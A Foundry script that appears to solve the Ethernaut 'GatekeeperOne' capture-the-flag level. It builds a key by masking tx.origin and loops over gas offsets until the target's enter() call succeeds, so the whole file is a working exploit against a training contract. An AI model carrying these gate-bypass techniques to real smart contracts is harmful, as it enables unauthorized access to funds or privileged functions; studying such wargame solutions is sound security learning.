// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";

contract Solver is Script {
    address payable gatekeeper_one = payable(vm.envAddress("GATEKEEPERONE_INSTANCE"));

    function setUp() public {}

    function run() public {
        vm.startBroadcast(vm.envUint("PRIV_KEY"));

        Solution solution = new Solution();
        solution.solve(gatekeeper_one);

        vm.stopBroadcast();
    }
}

contract Solution {

    function solve(address gatekeeper_one) external {
        bytes8 my_key = bytes8(uint64(uint160(tx.origin))) & 0xffffffff0000ffff;

        for (uint offset = 0; offset < 8191; ++offset){
            (bool suc, ) = gatekeeper_one.call{gas: 8191 * 10 + offset}(abi.encodeWithSignature("enter(bytes8)", my_key));
            if (suc) {
                break;
            }
        }

    }
}